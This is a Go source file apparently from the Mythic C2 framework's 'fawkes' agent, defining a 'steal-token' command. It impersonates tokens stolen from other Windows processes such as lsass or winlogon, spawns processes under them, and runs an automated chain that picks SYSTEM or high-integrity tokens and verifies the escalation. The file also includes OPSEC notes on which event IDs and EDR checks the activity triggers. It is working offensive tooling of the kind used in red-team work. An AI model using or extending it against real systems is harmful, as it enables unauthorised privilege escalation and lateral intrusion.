package agentfunctions

import (
	"encoding/json"
	"fmt"
	"path/filepath"
	"strconv"
	"strings"

	"github.com/MythicMeta/MythicContainer/logging"
	"github.com/MythicMeta/MythicContainer/mythicrpc"

	agentstructs "github.com/MythicMeta/MythicContainer/agent_structs"
)

func init() {
	agentstructs.AllPayloadData.Get("fawkes").AddCommand(agentstructs.Command{
		Name:                "steal-token",
		Description:         "Steal and impersonate a token from another process, or spawn a process with a stolen token. auto-escalate: automated token enumeration and privilege escalation chain.",
		HelpString:          "steal-token -pid <PID> [-action spawn -command <cmd>]\nsteal-token -action auto-escalate",
		Version:             2,
		SupportedUIFeatures: []string{},
		Author:              "@galoryber",
		MitreAttackMappings: []string{"T1134.001", "T1134.002"},
		ScriptOnlyCommand:   false,
		CommandAttributes: agentstructs.CommandAttribute{
			SupportedOS: []string{agentstructs.SUPPORTED_OS_WINDOWS},
			FilterCommandAvailabilityByAgentBuildParameters: map[string]string{"selected_os": "Windows"},
		},
		TaskCompletionFunctions: map[string]agentstructs.PTTaskCompletionFunction{
			"autoEscalateEnumDone":    autoEscalateEnumDone,
			"autoEscalateStealDone":   autoEscalateStealDone,
			"autoEscalateWhoamiDone":  autoEscalateWhoamiDone,
			"autoEscalateGetprivDone": autoEscalateGetprivDone,
		},
		CommandParameters: []agentstructs.CommandParameter{
			{
				Name:                                    "action",
				ModalDisplayName:                        "Action",
				CLIName:                                 "action",
				ParameterType:                           agentstructs.COMMAND_PARAMETER_TYPE_CHOOSE_ONE,
				Description:                             "impersonate: steal token and impersonate (default). spawn: steal token and create a process with it. auto-escalate: enum tokens → steal best → verify.",
				Choices:                                 []string{"impersonate", "spawn", "auto-escalate"},
				DefaultValue:                            "impersonate",
				SupportedAgents:                         []string{},
				ChoicesAreAllCommands:                   false,
				ChoicesAreLoadedCommands:                false,
				FilterCommandChoicesByCommandAttributes: map[string]string{},
				DynamicQueryFunction:                    nil,
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{
						ParameterIsRequired: false,
						UIModalPosition:     1,
						GroupName:            "Default",
					},
				},
			},
			{
				Name:                                    "pid",
				ModalDisplayName:                        "Process ID",
				CLIName:                                 "pid",
				ParameterType:                           agentstructs.COMMAND_PARAMETER_TYPE_STRING,
				Description:                             "Process ID to steal token from (e.g., lsass.exe, winlogon.exe)",
				Choices:                                 []string{},
				DefaultValue:                            "",
				DynamicQueryFunction:                    getProcessList,
				SupportedAgents:                         []string{},
				ChoicesAreAllCommands:                   false,
				ChoicesAreLoadedCommands:                false,
				FilterCommandChoicesByCommandAttributes: map[string]string{},
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{
						ParameterIsRequired: true,
						UIModalPosition:     2,
						GroupName:            "Default",
					},
				},
			},
			{
				Name:                                    "command",
				ModalDisplayName:                        "Command Line",
				CLIName:                                 "command",
				ParameterType:                           agentstructs.COMMAND_PARAMETER_TYPE_STRING,
				Description:                             "Command line to execute when action=spawn (e.g., cmd.exe /c whoami, or path to payload)",
				Choices:                                 []string{},
				DefaultValue:                            "",
				SupportedAgents:                         []string{},
				ChoicesAreAllCommands:                   false,
				ChoicesAreLoadedCommands:                false,
				FilterCommandChoicesByCommandAttributes: map[string]string{},
				DynamicQueryFunction:                    nil,
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{
						ParameterIsRequired: false,
						UIModalPosition:     3,
						GroupName:            "Default",
					},
				},
			},
		},
		AssociatedBrowserScript: &agentstructs.BrowserScript{
			ScriptPath: filepath.Join(".", "fawkes", "browserscripts", "tokenstore_new.js"),
			Author:     "@galoryber",
		},
		TaskFunctionOPSECPre: func(taskData *agentstructs.PTTaskMessageAllData) agentstructs.PTTTaskOPSECPreTaskMessageResponse {
			action, _ := taskData.Args.GetStringArg("action")
			pid, _ := taskData.Args.GetStringArg("pid")

			msg := fmt.Sprintf("OPSEC WARNING: Stealing token from PID %s. Opens target process with TOKEN_DUPLICATE access.", pid)
			if action == "spawn" {
				command, _ := taskData.Args.GetStringArg("command")
				msg += fmt.Sprintf(" Spawning process '%s' with stolen token via CreateProcessWithTokenW.", command)
				msg += " Generates Event ID 4624 (logon) and Event ID 4688 (process creation). EDR monitors cross-process token theft + child process creation."
			} else {
				msg += " Impersonates the stolen security context. Generates Event ID 4624 (impersonation logon) and may trigger EDR process access monitoring."
			}

			return agentstructs.PTTTaskOPSECPreTaskMessageResponse{
				TaskID:             taskData.Task.ID,
				Success:            true,
				OpsecPreBlocked:    false,
				OpsecPreMessage:    msg,
				OpsecPreBypassRole: agentstructs.OPSEC_ROLE_OPERATOR,
			}
		},
		TaskFunctionOPSECPost: func(taskData *agentstructs.PTTaskMessageAllData) agentstructs.PTTaskOPSECPostTaskMessageResponse {
			action, _ := taskData.Args.GetStringArg("action")
			pid, _ := taskData.Args.GetStringArg("pid")

			msg := fmt.Sprintf("OPSEC AUDIT: Token stolen from PID %s.", pid)
			if action == "spawn" {
				msg += " Spawned process runs under stolen token. Kill the spawned process to clean up. Check Event ID 4688 for process creation evidence."
			} else {
				msg += " Cleanup: use 'rev2self' to revert to original token. The stolen token handle remains open until reverted. Check Event ID 4624/4634 for impersonation evidence."
			}

			return agentstructs.PTTaskOPSECPostTaskMessageResponse{
				TaskID:              taskData.Task.ID,
				Success:             true,
				OpsecPostBlocked:    false,
				OpsecPostMessage:    msg,
				OpsecPostBypassRole: agentstructs.OPSEC_ROLE_OPERATOR,
			}
		},
		TaskFunctionParseArgString: func(args *agentstructs.PTTaskMessageArgsData, input string) error {
			if input == "" {
				return nil
			}
			return args.LoadArgsFromJSONString(input)
		},
		TaskFunctionParseArgDictionary: func(args *agentstructs.PTTaskMessageArgsData, input map[string]interface{}) error {
			return args.LoadArgsFromDictionary(input)
		},
		TaskFunctionCreateTasking: func(taskData *agentstructs.PTTaskMessageAllData) agentstructs.PTTaskCreateTaskingMessageResponse {
			response := agentstructs.PTTaskCreateTaskingMessageResponse{
				Success: true,
				TaskID:  taskData.Task.ID,
			}
			action, _ := taskData.Args.GetStringArg("action")
			pid, _ := parsePIDFromArg(taskData)

			if action == "auto-escalate" {
				display := "auto-escalate: enum-tokens → steal → whoami → getprivs"
				response.DisplayParams = &display
				createArtifact(taskData.Task.ID, "Subtask Chain", "Token auto-escalation chain (T1134.001)")
				logOperationEvent(taskData.Task.ID, "[CHAIN] Token auto-escalation started", false)

				// Step 1: Enumerate tokens
				callbackFunc := "autoEscalateEnumDone"
				_, err := mythicrpc.SendMythicRPCTaskCreateSubtask(
					mythicrpc.MythicRPCTaskCreateSubtaskMessage{
						TaskID:                  taskData.Task.ID,
						SubtaskCallbackFunction: &callbackFunc,
						CommandName:             "enum-tokens",
						Params:                  `{"action":"unique"}`,
					},
				)
				if err != nil {
					response.Success = false
					response.Error = "Failed to start token enumeration: " + err.Error()
				}
				return response
			}

			if action == "spawn" {
				command, _ := taskData.Args.GetStringArg("command")
				display := fmt.Sprintf("spawn PID:%d → %s", pid, command)
				response.DisplayParams = &display
				createArtifact(taskData.Task.ID, "Token Spawn",
					fmt.Sprintf("OpenProcess + OpenProcessToken + DuplicateTokenEx on PID %d, CreateProcessWithTokenW: %s", pid, command))
			} else {
				display := fmt.Sprintf("PID: %d", pid)
				response.DisplayParams = &display
				createArtifact(taskData.Task.ID, "Token Steal",
					fmt.Sprintf("OpenProcess + OpenProcessToken + DuplicateTokenEx on PID %d", pid))
			}

			return response
		},
		TaskFunctionProcessResponse: func(processResponse agentstructs.PtTaskProcessResponseMessage) agentstructs.PTTaskProcessResponseMessageResponse {
			response := agentstructs.PTTaskProcessResponseMessageResponse{
				TaskID:  processResponse.TaskData.Task.ID,
				Success: true,
			}

			responseText, ok := processResponse.Response.(string)
			if !ok || responseText == "" {
				return response
			}

			action, _ := processResponse.TaskData.Args.GetStringArg("action")
			pidStr, _ := processResponse.TaskData.Args.GetStringArg("pid")
			pid := pidStr
			pidInt, _ := strconv.Atoi(strings.TrimSpace(strings.Split(pidStr, " - ")[0]))

			if action == "spawn" {
				// Track spawn as process creation + operation event
				if strings.Contains(responseText, "New PID:") {
					// Extract identity from "Token identity: DOMAIN\user" or "Spawned process as DOMAIN\user"
					user := ""
					for _, line := range strings.Split(responseText, "\n") {
						trimmed := strings.TrimSpace(line)
						if strings.HasPrefix(trimmed, "Token identity:") {
							user = strings.TrimSpace(strings.TrimPrefix(trimmed, "Token identity:"))
						} else if strings.HasPrefix(trimmed, "Spawned process as") {
							user = strings.TrimSpace(strings.TrimPrefix(trimmed, "Spawned process as"))
						}
					}

					logOperationEvent(processResponse.TaskData.Task.ID,
						fmt.Sprintf("[TOKEN SPAWN] Created process with stolen token from PID %s as %s", pid, user), false)

					createArtifact(processResponse.TaskData.Task.ID, "Process Created",
						fmt.Sprintf("CreateProcessWithTokenW with token from PID %s (user: %s)", pid, user))
				}
				return response
			}

			// Original impersonate behavior: track token
			if !strings.Contains(responseText, "New:") {
				return response
			}

			user := ""
			for _, line := range strings.Split(responseText, "\n") {
				if strings.HasPrefix(strings.TrimSpace(line), "New:") {
					user = strings.TrimSpace(strings.TrimPrefix(strings.TrimSpace(line), "New:"))
					break
				}
			}
			if user == "" {
				return response
			}

			// Register token with Mythic's callback token tracker
			host := processResponse.TaskData.Callback.Host
			_, err := mythicrpc.SendMythicRPCCallbackTokenCreate(mythicrpc.MythicRPCCallbackTokenCreateMessage{
				TaskID: processResponse.TaskData.Task.ID,
				CallbackTokens: []mythicrpc.MythicRPCCallbackTokenData{
					{
						Action:  "add",
						Host:    &host,
						TokenID: uint64(processResponse.TaskData.Task.ID),
						TokenInfo: &mythicrpc.MythicRPCTokenCreateTokenData{
							User:      user,
							ProcessID: pidInt,
						},
					},
				},
			})
			if err != nil {
				logging.LogError(err, "Failed to register stolen token with Mythic", "user", user, "pid", pid)
			}

			// Tag elevated access
			if strings.Contains(strings.ToUpper(user), "SYSTEM") {
				tagTask(processResponse.TaskData.Task.ID, "SYSTEM",
					fmt.Sprintf("Stole SYSTEM token from PID %s", pid))
			} else {
				tagTask(processResponse.TaskData.Task.ID, "ELEVATED",
					fmt.Sprintf("Stole token: %s (PID %s)", user, pid))
			}

			return response
		},
	})
}

// --- Auto-Escalate Subtask Chain ---
// Chain: enum-tokens → steal-token (best PID) → whoami → getprivs

type autoEscalateToken struct {
	PID       uint32 `json:"pid"`
	Process   string `json:"process"`
	User      string `json:"user"`
	Integrity string `json:"integrity"`
}

// autoEscalateEnumDone handles enum-tokens completion: selects best token and steals it.
func autoEscalateEnumDone(taskData *agentstructs.PTTaskMessageAllData, subtaskData *agentstructs.PTTaskMessageAllData, groupName *agentstructs.SubtaskGroupName) agentstructs.PTTaskCompletionFunctionMessageResponse {
	response := agentstructs.PTTaskCompletionFunctionMessageResponse{
		TaskID:  taskData.Task.ID,
		Success: true,
	}

	responseText := getSubtaskResponses(subtaskData.Task.ID)
	if responseText == "" || responseText == "[]" {
		completed := true
		response.Completed = &completed
		msg := "Auto-escalate: no tokens found"
		response.Stdout = &msg
		mythicrpc.SendMythicRPCResponseCreate(mythicrpc.MythicRPCResponseCreateMessage{
			TaskID: taskData.Task.ID, Response: []byte(msg),
		})
		return response
	}

	var tokens []autoEscalateToken
	if err := json.Unmarshal([]byte(responseText), &tokens); err != nil {
		completed := true
		response.Completed = &completed
		msg := fmt.Sprintf("Auto-escalate: failed to parse token list: %s", err.Error())
		response.Stderr = &msg
		return response
	}

	// Select best token: prefer SYSTEM, then High integrity, then any different user
	bestToken := selectBestToken(tokens, taskData.Callback.User)
	if bestToken == nil {
		completed := true
		response.Completed = &completed
		msg := fmt.Sprintf("Auto-escalate: found %d tokens but none suitable for escalation (already highest privilege or no different users)", len(tokens))
		response.Stdout = &msg
		mythicrpc.SendMythicRPCResponseCreate(mythicrpc.MythicRPCResponseCreateMessage{
			TaskID: taskData.Task.ID, Response: []byte(msg),
		})
		return response
	}

	mythicrpc.SendMythicRPCResponseCreate(mythicrpc.MythicRPCResponseCreateMessage{
		TaskID:   taskData.Task.ID,
		Response: []byte(fmt.Sprintf("[Step 1/4] Enumerated %d tokens. Selected: %s (PID %d, %s integrity)", len(tokens), bestToken.User, bestToken.PID, bestToken.Integrity)),
	})

	// Step 2: Steal the selected token
	callbackFunc := "autoEscalateStealDone"
	params := fmt.Sprintf(`{"action":"impersonate","pid":%d}`, bestToken.PID)
	_, err := mythicrpc.SendMythicRPCTaskCreateSubtask(
		mythicrpc.MythicRPCTaskCreateSubtaskMessage{
			TaskID:                  taskData.Task.ID,
			SubtaskCallbackFunction: &callbackFunc,
			CommandName:             "steal-token",
			Params:                  params,
		},
	)
	if err != nil {
		completed := true
		response.Completed = &completed
		msg := fmt.Sprintf("Auto-escalate: failed to steal token from PID %d: %s", bestToken.PID, err.Error())
		response.Stderr = &msg
		return response
	}

	return response
}

// autoEscalateStealDone handles steal-token completion: runs whoami to verify.
func autoEscalateStealDone(taskData *agentstructs.PTTaskMessageAllData, subtaskData *agentstructs.PTTaskMessageAllData, groupName *agentstructs.SubtaskGroupName) agentstructs.PTTaskCompletionFunctionMessageResponse {
	response := agentstructs.PTTaskCompletionFunctionMessageResponse{
		TaskID:  taskData.Task.ID,
		Success: true,
	}

	responseText := getSubtaskResponses(subtaskData.Task.ID)
	mythicrpc.SendMythicRPCResponseCreate(mythicrpc.MythicRPCResponseCreateMessage{
		TaskID:   taskData.Task.ID,
		Response: []byte(fmt.Sprintf("[Step 2/4] Token stolen. %s", strings.TrimSpace(responseText))),
	})

	// Step 3: Verify new identity
	callbackFunc := "autoEscalateWhoamiDone"
	_, err := mythicrpc.SendMythicRPCTaskCreateSubtask(
		mythicrpc.MythicRPCTaskCreateSubtaskMessage{
			TaskID:                  taskData.Task.ID,
			SubtaskCallbackFunction: &callbackFunc,
			CommandName:             "whoami",
			Params:                  "{}",
		},
	)
	if err != nil {
		completed := true
		response.Completed = &completed
		msg := fmt.Sprintf("Auto-escalate: token stolen but whoami failed: %s", err.Error())
		response.Stderr = &msg
		return response
	}

	return response
}

// autoEscalateWhoamiDone handles whoami completion: runs getprivs.
func autoEscalateWhoamiDone(taskData *agentstructs.PTTaskMessageAllData, subtaskData *agentstructs.PTTaskMessageAllData, groupName *agentstructs.SubtaskGroupName) agentstructs.PTTaskCompletionFunctionMessageResponse {
	response := agentstructs.PTTaskCompletionFunctionMessageResponse{
		TaskID:  taskData.Task.ID,
		Success: true,
	}

	responseText := getSubtaskResponses(subtaskData.Task.ID)
	mythicrpc.SendMythicRPCResponseCreate(mythicrpc.MythicRPCResponseCreateMessage{
		TaskID:   taskData.Task.ID,
		Response: []byte(fmt.Sprintf("[Step 3/4] Identity verified: %s", strings.TrimSpace(responseText))),
	})

	// Step 4: Check new privileges
	callbackFunc := "autoEscalateGetprivDone"
	_, err := mythicrpc.SendMythicRPCTaskCreateSubtask(
		mythicrpc.MythicRPCTaskCreateSubtaskMessage{
			TaskID:                  taskData.Task.ID,
			SubtaskCallbackFunction: &callbackFunc,
			CommandName:             "getprivs",
			Params:                  "{}",
		},
	)
	if err != nil {
		completed := true
		response.Completed = &completed
		msg := fmt.Sprintf("Auto-escalate: identity confirmed but getprivs failed: %s", err.Error())
		response.Stderr = &msg
		return response
	}

	return response
}

// autoEscalateGetprivDone handles getprivs completion: aggregates and reports.
func autoEscalateGetprivDone(taskData *agentstructs.PTTaskMessageAllData, subtaskData *agentstructs.PTTaskMessageAllData, groupName *agentstructs.SubtaskGroupName) agentstructs.PTTaskCompletionFunctionMessageResponse {
	response := agentstructs.PTTaskCompletionFunctionMessageResponse{
		TaskID:  taskData.Task.ID,
		Success: true,
	}

	responseText := getSubtaskResponses(subtaskData.Task.ID)
	privCount := strings.Count(responseText, "\n")

	mythicrpc.SendMythicRPCResponseCreate(mythicrpc.MythicRPCResponseCreateMessage{
		TaskID:   taskData.Task.ID,
		Response: []byte(fmt.Sprintf("[Step 4/4] Privileges enumerated: %d privileges available", privCount)),
	})

	// Aggregate results
	summary := "=== Auto-Escalate Chain Complete ===\n"
	parentID := taskData.Task.ID
	searchResult, err := mythicrpc.SendMythicRPCTaskSearch(mythicrpc.MythicRPCTaskSearchMessage{
		TaskID:             parentID,
		SearchParentTaskID: &parentID,
	})
	if err == nil && searchResult.Success {
		for _, task := range searchResult.Tasks {
			summary += fmt.Sprintf("[%s] %s %s\n", task.Status, task.CommandName, task.DisplayParams)
		}
	}

	completed := true
	response.Completed = &completed
	response.Stdout = &summary

	mythicrpc.SendMythicRPCResponseCreate(mythicrpc.MythicRPCResponseCreateMessage{
		TaskID: taskData.Task.ID, Response: []byte(summary),
	})

	return response
}

// selectBestToken picks the highest-privilege token different from current user.
func selectBestToken(tokens []autoEscalateToken, currentUser string) *autoEscalateToken {
	var systemTokens, highTokens, otherTokens []*autoEscalateToken

	for i := range tokens {
		t := &tokens[i]
		// Skip current user
		if strings.EqualFold(t.User, currentUser) {
			continue
		}
		upper := strings.ToUpper(t.User)
		if strings.Contains(upper, "SYSTEM") || strings.Contains(upper, "NT AUTHORITY\\SYSTEM") {
			systemTokens = append(systemTokens, t)
		} else if strings.EqualFold(t.Integrity, "High") || strings.EqualFold(t.Integrity, "System") {
			highTokens = append(highTokens, t)
		} else {
			otherTokens = append(otherTokens, t)
		}
	}

	// Prefer SYSTEM > High integrity > any other user
	if len(systemTokens) > 0 {
		return systemTokens[0]
	}
	if len(highTokens) > 0 {
		return highTokens[0]
	}
	if len(otherTokens) > 0 {
		return otherTokens[0]
	}
	return nil
}
